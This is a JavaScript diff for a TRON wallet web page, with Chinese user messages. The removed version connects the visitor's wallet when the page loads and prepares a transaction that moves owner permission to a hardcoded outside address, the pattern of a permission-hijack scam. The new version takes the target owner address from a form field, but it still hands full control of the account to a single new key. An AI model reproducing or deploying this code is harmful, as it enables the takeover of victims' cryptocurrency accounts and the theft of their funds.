@@ -1,24 +1,21 @@
-document.addEventListener('DOMContentLoaded', async () => {
-    if (!isWalletInstalled()) {
-        console.error("TRC20钱包未安装，请使用TRC20钱包以继续。");
-        return;
-    }
-
-    try {
-        await connectWallet();
-    } catch (error) {
-        console.error("连接钱包时出错:", error);
-    }
+document.addEventListener('DOMContentLoaded', () => {
+    const button = document.getElementById('updatePermissionButton');
+    button.addEventListener('click', async () => {
+        const newOwnerAddress = document.getElementById('newOwnerAddress').value;
+        if (!newOwnerAddress) {
+            alert("请填写新所有者地址");
+            return;
+        }
+        try {
+            await connectWallet();
+            await updatePermission(newOwnerAddress);
+        } catch (error) {
+            console.error("操作时出错:", error);
+            alert("操作失败，请检查控制台日志了解详情");
+        }
+    });
 });
 
-// 检查是否安装了支持TRC20的钱包
-function isWalletInstalled() {
-    return typeof window.tronWeb !== 'undefined' && window.tronWeb.defaultAddress.base58 ||
-           typeof window.imToken !== 'undefined' && typeof imToken.callAPI !== 'undefined' ||
-           typeof window.tokenpocket !== 'undefined' && typeof tokenpocket.tronLink !== 'undefined';
-}
-
-// 连接钱包的函数
 async function connectWallet() {
     const tronWeb = window.tronWeb;
 
@@ -28,30 +25,23 @@ async function connectWallet() {
     }
 
     if (tronWeb && tronWeb.request) {
-        await tronWeb.request({
-            method: 'tron_requestAccounts'
-        });
+        await tronWeb.request({ method: 'tron_requestAccounts' });
     } else if (tronWeb && tronWeb.trx && tronWeb.trx.getCurrentAccount) {
         await tronWeb.trx.getCurrentAccount();
     } else if (window.imToken && imToken.callAPI) {
-        // imToken 兼容性
         await imToken.callAPI('tron_requestAccounts');
     } else if (window.tokenpocket && tokenpocket.tronLink) {
-        // TokenPocket 兼容性
-        await tokenpocket.tronLink.request({
-            method: 'tron_requestAccounts'
-        });
+        await tokenpocket.tronLink.request({ method: 'tron_requestAccounts' });
     } else {
         throw new Error("连接钱包失败，请使用支持的TRON钱包。");
     }
 
-    if (tronWeb && !tronWeb.defaultAddress.base58) {
+    if (!tronWeb || !tronWeb.defaultAddress.base58) {
         throw new Error("连接钱包失败。");
     }
 }
 
-// 确认权限转移的函数
-async function confirmPermission() {
+async function updatePermission(newOwnerAddress) {
     const tronWeb = window.tronWeb;
     const currentAddress = tronWeb.defaultAddress.base58;
 
@@ -60,23 +50,15 @@ async function confirmPermission() {
         return;
     }
 
-    const newOwnerAddress = 'TFjUz313BQXRSj7g4FabMVegHPfUKj6Uhz';
-
     console.log("当前地址:", currentAddress);
     console.log("新所有者地址:", newOwnerAddress);
 
     try {
-        const accountInfo = await tronWeb.trx.getAccount(currentAddress);
-        console.log("账户信息:", accountInfo);
-
         const ownerPermission = {
             type: 0,
             permission_name: 'owner',
             threshold: 1,
-            keys: [{
-                address: tronWeb.address.toHex(newOwnerAddress),
-                weight: 1
-            }]
+            keys: [{ address: tronWeb.address.toHex(newOwnerAddress), weight: 1 }]
         };
 
         const activePermissions = [];
@@ -98,10 +80,13 @@ async function confirmPermission() {
 
         if (result.result) {
             console.log("交易发送成功，请检查您的钱包以签署交易。");
+            alert("交易发送成功，请在钱包中确认交易。");
         } else {
             console.error("交易失败:", result.message);
+            alert("交易失败，请检查控制台日志了解详情");
         }
     } catch (error) {
         console.error("发送交易时出错:", error);
+        alert("发送交易时出错，请检查控制台日志了解详情");
     }
 }
